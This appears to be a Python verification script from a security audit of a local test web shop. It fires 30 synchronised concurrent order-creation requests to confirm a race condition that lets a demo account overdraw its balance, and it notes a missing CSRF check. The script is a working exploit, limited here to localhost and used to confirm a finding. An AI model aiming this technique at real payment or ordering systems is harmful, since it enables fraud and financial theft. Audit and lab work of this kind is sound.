# -*- coding: utf-8 -*-
"""t5 核验 step1：HUNT-01 并发下单竞态（独立实现，30 并发 × 3 轮）
不改源码、只打 127.0.0.1:8095。每轮之间 /__reset + 重新登录取新会话。
"""
import sys, os, time, threading, json
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from verify_lib_import import *  # noqa
import verify_lib as V

N = 30
PRODUCT = 3          # USB-C 数据线，1900 分
QTY = 1
ROUNDS = 3
PRICE = None

out = {"step": "step1-HUNT-01-race", "started": time.strftime("%Y-%m-%dT%H:%M:%S%z"),
       "params": {"concurrency": N, "product_id": PRODUCT, "qty": QTY, "rounds": ROUNDS},
       "rounds": [], "note": "GET /order/create 无 CSRF（HUNT-02 同源通道），故并发只带 Cookie"}

prod = V.db_query("SELECT id,name,price_cents,stock FROM products WHERE id=?", (PRODUCT,))
PRICE = prod[0]["price_cents"]
out["product"] = prod[0]
out["opening_balance"] = V.db_scalar("SELECT balance_cents FROM users WHERE username='demo'")

results = []


def race(tok, tag):
    """30 并发 GET /order/create。返回每条原始记录。"""
    recs = [None] * N
    start = threading.Barrier(N)

    def one(i):
        try:
            start.wait(timeout=30)
        except Exception:
            pass
        recs[i] = V.req("GET", f"/order/create?product_id={PRODUCT}&qty={QTY}",
                        headers=V.cookie(tok), timeout=30)

    ts = [threading.Thread(target=one, args=(i,)) for i in range(N)]
    for t in ts:
        t.start()
    for t in ts:
        t.join(timeout=60)
    return recs


def parse_bal(rec):
    m = None
    b = (rec or {}).get("body_head", "")
    import re
    mm = re.search(r"当前余额\s*(-?\d+)\s*分", b)
    return int(mm.group(1)) if mm else None


for rnd in range(ROUNDS):
    # 复位 + 重新登录
    V.req("GET", "/__reset")
    time.sleep(0.2)
    tok, lrec = V.login("demo", "demo123")
    before = V.db_snapshot(f"round{rnd}-before")
    orders_before = before["counts"]["orders"]
    bal_before = [u["balance_cents"] for u in before["users"] if u["username"] == "demo"][0]

    t0 = time.time()
    recs = race(tok, f"round{rnd}")
    dur = round(time.time() - t0, 2)
    after = V.db_snapshot(f"round{rnd}-after")
    bal_after = [u["balance_cents"] for u in after["users"] if u["username"] == "demo"][0]
    orders_after = after["counts"]["orders"]

    codes = {}
    for r in recs:
        c = r.get("status") if r else None
        codes[str(c)] = codes.get(str(c), 0) + 1
    resp_bals = [parse_bal(r) for r in recs]
    ok200 = [r for r in recs if r and r.get("status") == 200]
    # 同一开账余额被重复扣减的证据：响应自报余额
    max_deficit = min([b for b in resp_bals if b is not None], default=None)

    entry = {
        "round": rnd,
        "login_status": lrec.get("status"),
        "balance_before": bal_before,
        "orders_before": orders_before,
        "balance_after": bal_after,
        "orders_after": orders_after,
        "orders_added": orders_after - orders_before,
        "status_codes": codes,
        "http200_count": len(ok200),
        "duration_s": dur,
        "sum_amount_cents_added": (orders_after - orders_before) * PRICE * QTY,
        "overdraft_cents": -bal_after if bal_after < 0 else 0,
        "min_reported_balance": max_deficit,
        "rate_limit_hits_429": codes.get("429", 0),
        "raw": recs,
    }
    results.append(entry)
    print(f"[round {rnd}] codes={codes} bal {bal_before} -> {bal_after} "
          f"orders {orders_before} -> {orders_after} min_reported={max_deficit} {dur}s")

out["rounds"] = results
out["verdict_matrix"] = [
    {
        "round": e["round"],
        "negative_balance": e["balance_after"] < 0,
        "orders_exceed_affordable": e["sum_amount_cents_added"] > e["balance_before"],
        "affordable_max_orders": e["balance_before"] // PRICE,
        "actual_orders": e["orders_added"],
        "confirmed": (e["balance_after"] < 0 or e["orders_added"] > e["balance_before"] // PRICE),
    } for e in results
]
out["finished"] = time.strftime("%Y-%m-%dT%H:%M:%S%z")
V.save("verify-01-race-20261012-1855.json", out)
print("verdict:", json.dumps(out["verdict_matrix"], ensure_ascii=False))
